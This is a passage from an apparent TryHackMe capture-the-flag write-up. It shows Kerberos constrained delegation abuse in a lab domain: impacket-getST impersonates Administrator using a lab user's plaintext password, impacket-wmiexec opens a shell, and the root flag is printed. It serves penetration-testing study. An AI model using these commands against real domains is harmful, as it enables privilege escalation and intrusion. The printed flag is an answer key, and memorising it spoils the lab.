Look at the `DARLA_WINTERS` node and see that delegation is possible for the CIFS service.

![[Screenshot from 2024-08-18 13-04-37.png]]

#### DARLA_WINTERS\@THM.CORP -> AllowedToDelegate -> HAYSTACK.THM.CORP

The **AllowedToDelegate** permission allows us (in this case DARLA_WINTERS\@THM.CORP) to impersonate the **Administrator** account by targeting the CIFS service to retrieve a usable TGS ticket**.

To do this is use an `mpacket` script named `getST`.
Due to the fact the machine has AV turned on this is the easier way of do the job.

- Run on the attacking machine:

	`impacket-getST -spn cifs/HAYSTACK.THM.CORP -impersonate Administrator "thm.corp/DARLA_WINTERS:Password@2022" -dc-ip <MACHINE IP`

	
	![[Screenshot from 2024-08-18 13-10-03.png]]
	The ticket is save in Administrator.ccache file.

- Set the variable `KRB5CCNAME` via `export KRB5CCNAME=<filename>`

	`export KRB5CCNAME=Administrator.ccache'

- Run `impacket-wmiexec`.
	`impacket-wmiexec -no-pass -k thm.corp/administrator@HAYSTACK.THM.CORP`

	![[Screenshot from 2024-08-20 11-46-09.png]]

- Run `whoami`.
	![[Screenshot from 2024-08-20 11-48-59.png]]

- Go to `C:\users\Administrator\Desktop>` and run type `root.txt`.
	You'll get root's flag.
	THM{RE_RE_RE_SET_AND_DELEGATE}
